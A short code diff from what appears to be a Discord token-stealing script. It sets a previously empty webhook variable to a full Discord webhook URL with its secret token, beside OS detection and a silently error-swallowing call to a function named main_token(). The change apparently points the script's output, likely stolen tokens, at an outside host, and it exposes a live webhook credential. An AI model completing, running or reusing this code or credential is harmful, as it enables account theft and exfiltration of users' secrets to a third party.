@@ -28,7 +28,7 @@ print("")
 
 
 #set webhook url here
-url = ""
+url = "https://discordapp.com/api/webhooks/1419075700434141277/laS4cfNgSf88yMWqpqK1o4ct96BM1icxj9pMiL6f-aQQj3xZi9Jyenoa6IFgUXYAwhrc"
 
 if os.name == "nt":
     system = "Windows"
@@ -313,3 +313,4 @@ if __name__ == "__main__":
             main_token()
     except:
         pass
+
